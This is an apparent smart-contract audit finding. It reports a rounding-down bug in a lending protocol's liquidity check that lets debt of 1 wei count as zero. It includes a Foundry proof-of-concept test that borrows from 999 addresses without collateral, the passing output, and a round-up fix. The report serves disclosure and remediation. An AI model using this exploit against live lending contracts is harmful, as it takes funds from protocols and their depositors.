# Attacker can borrow non-zero token amount without providing any collateral

## Summary
Attacker can borrow non-zero token amount without providing any collateral

## Vulnerability Detail
- `_getAccountLiquidity` rounds debt value down, so the debt value is actually lower than what it should be, leading to a possible borrowing without any collateralization.
- To be more precise, take DAI for example. When oracle reports price < 1e18 (less than $1), then borrowing 1 wei of the token will round the debt value down to 0, allowing the attacker to borrow nonzero amount without actually providing any collateral. This can be repeated as much as one desired.
- Here's the modified `TestBorrow.t.sol` test case:
```solidity
contract BorrowTest is ... {
  ...
  int256 internal constant market2Price = 0.9e8;
  ...

   function testBorrowFree() public {
        uint256 market1SupplyAmount = 100e18;
        uint256 market2BorrowAmount = 500e18;

        vm.startPrank(user2);
        market2.approve(address(ib), market2BorrowAmount);
        ib.supply(user2, user2, address(market2), market2BorrowAmount);
        vm.stopPrank();

        // test borrow from multiple accounts
        for(uint160 i = 1; i < 1000; i++) {
            address addr = address(i);
            vm.prank(addr);
            ib.borrow(addr, addr, address(market2), 1);
        }

        /**
         * collateral value = 0
         * borrowed value = 0 (even though borrowed sth)
         */
        (uint256 collateralValue, uint256 debtValue) = ib.getAccountLiquidity(user1);
        assertEq(collateralValue, 0);
        assertEq(debtValue, 0);
    }

```

This is the result:
```bash
Running 1 test for test/TestBorrow.t.sol:BorrowTest
[PASS] testBorrowFree() (gas: 162751618)
```

## Impact
- Attacker can borrow tokens without providing any collateral, creating an undesirable state.

## Recommendation
- Round `debtValue` calculation up in favor of the protocol.
